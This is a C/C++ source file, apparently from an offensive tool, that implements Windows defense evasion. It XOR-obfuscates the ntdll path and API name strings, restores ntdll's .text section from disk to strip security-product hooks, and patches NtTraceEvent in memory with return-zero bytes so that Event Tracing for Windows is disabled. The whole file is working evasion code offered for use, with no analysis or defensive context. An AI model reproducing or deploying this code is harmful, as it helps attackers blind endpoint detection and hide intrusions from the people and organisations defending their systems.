#include "etw_pass.h"
#include <winternl.h>
#pragma comment (lib, "advapi32")
#pragma comment(lib, "mscoree.lib")

#pragma once

PVOID GetBaseAddressNtdll() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#elif _WIN32
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - sizeof(LIST_ENTRY));

    return pLdr->DllBase;
}

PVOID pNtdllBase = (PVOID)GetBaseAddressNtdll();

typedef BOOL(WINAPI* ProtectMemory_t)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef HANDLE(WINAPI* CreateMapping_t)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR);
typedef LPVOID(WINAPI* MapFile_t)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
typedef BOOL(WINAPI* UnmapFile_t)(LPCVOID);

ProtectMemory_t ProtectMemory_p = NULL;
unsigned char sNtdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };

unsigned char sNtdllPath[] = { 0x59, 0x0, 0x66, 0x4d, 0x53, 0x54, 0x5e, 0x55, 0x4d, 0x49, 0x66, 0x49, 0x43, 0x49, 0x4e, 0x5f, 0x57, 0x9, 0x8, 0x66, 0x54, 0x4e, 0x5e, 0x56, 0x56, 0x14, 0x5e, 0x56, 0x56, 0x3a };
unsigned char sCreateMapping[] = { 'C','r','e','a','t','e','F','i','l','e','M','a','p','p','i','n','g','A', 0 };
unsigned char sMapFile[] = { 'M','a','p','V','i','e','w','O','f','F','i','l','e',0 };
unsigned char sUnmapFile[] = { 'U','n','m','a','p','V','i','e','w','O','f','F','i','l','e', 0 };
unsigned char sProtectMemory[] = { 'V','i','r','t','u','a','l','P','r','o','t','e','c','t', 0 };

unsigned int sNtdllPath_len = sizeof(sNtdllPath);
unsigned int sNtdll_len = sizeof(sNtdll);

unsigned char sGetThis[] = { 'N','t','T','r','a','c','e','E','v','e','n','t', 0 };
// unsigned char sDisableETW[] = { 'E','t','w','E','v','e','n','t','W','r','i','t','e', 0 };

void SimpleXOR(char* data, size_t len, char key) {
    for (int i = 0; i < len; i++) {
        data[i] = (BYTE)data[i] ^ key;
    }
}

BOOL RestoreNtdll(const HMODULE hNtdll, const LPVOID pMapping) {
    DWORD oldprotect = 0;
    PIMAGE_DOS_HEADER pidh = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS pinh = (PIMAGE_NT_HEADERS)((DWORD_PTR)pMapping + pidh->e_lfanew);
    for (int i = 0; i < pinh->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER pish = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(pinh) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        if (!strcmp((char*)pish->Name, ".text")) {
            ProtectMemory_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            memcpy((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), (LPVOID)((DWORD_PTR)pMapping + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize);

            ProtectMemory_p((LPVOID)((DWORD_PTR)hNtdll + (DWORD_PTR)pish->VirtualAddress), pish->Misc.VirtualSize, oldprotect, &oldprotect);
            if (!oldprotect) {
                return -1;
            }
            return 0;
        }
    }
    return -1;
}

BOOL NeutralizeETW() {
    DWORD oldprotect = 0;
    // void* pEventWrite = reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sDisableETW));
    void* pEventWrite = reinterpret_cast<void*>(GetProcAddress(GetModuleHandleA("ntdll.dll"), (LPCSTR)sGetThis));

    if (!ProtectMemory_p(pEventWrite, 4096, PAGE_EXECUTE_READWRITE, &oldprotect)) {
        printf("[-] ProtectMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    // printf("[*] ETW EventWrite Base Address : 0x%p \n", pEventWrite);
    // getchar();

#ifdef _WIN64
    memcpy(pEventWrite, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret for x64
#else
    memcpy(pEventWrite, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14 for x86
#endif

    // printf ("[+] ETW EventWrite Patched, check mem\n");
    // getchar();

    if (!ProtectMemory_p(pEventWrite, 4096, oldprotect, &oldprotect)) {
        printf("[-] ProtectMemory Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    if (!FlushInstructionCache(GetCurrentProcess(), pEventWrite, 4096)) {
        printf("[-] FlushInstructionCache Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

bool everyThing() {
    int ret = 0;
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID pMapping;

    CreateMapping_t CreateMapping_p = (CreateMapping_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateMapping);
    MapFile_t MapFile_p = (MapFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sMapFile);
    UnmapFile_t UnmapFile_p = (UnmapFile_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sUnmapFile);
    ProtectMemory_p = (ProtectMemory_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sProtectMemory);

    printf("\n[*] Dirty ntdll base addr : 0x%p \n", pNtdllBase);
    SimpleXOR((char*)sNtdllPath, sNtdllPath_len, sNtdllPath[sNtdllPath_len - 1]);
    hFile = CreateFileA((LPCSTR)sNtdllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return -1;
    }

    hFileMapping = CreateMapping_p(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hFileMapping) {
        CloseHandle(hFile);
        return -1;
    }

    pMapping = MapFile_p(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return -1;
    }

    ret = RestoreNtdll(GetModuleHandleA((LPCSTR)sNtdllPath), pMapping);

    printf("[*] Fresh DLL base addr: 0x%p \n", sNtdll);

    UnmapFile_p(pMapping);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    printf("\n[+] Current process PID [%d]\n", GetCurrentProcessId());
    printf("\n[*] Ready For ETW \n");

    printf("[+] Press any key to continue \n"); getchar();

    if (!NeutralizeETW()) {
        return EXIT_FAILURE;
    } else {
        printf("\n[+] Post-Execution Patch Completed...\n");
        printf("\n");
        return EXIT_SUCCESS;
    }

}

// int main() {

//     if (everyThing() == EXIT_SUCCESS) {
//         printf("\n[+] ETW Patched Successfully...\n");
//     } else {
//         printf("\n[-] ETW Patch Failed...\n");
//     }
//     return 0;
// }
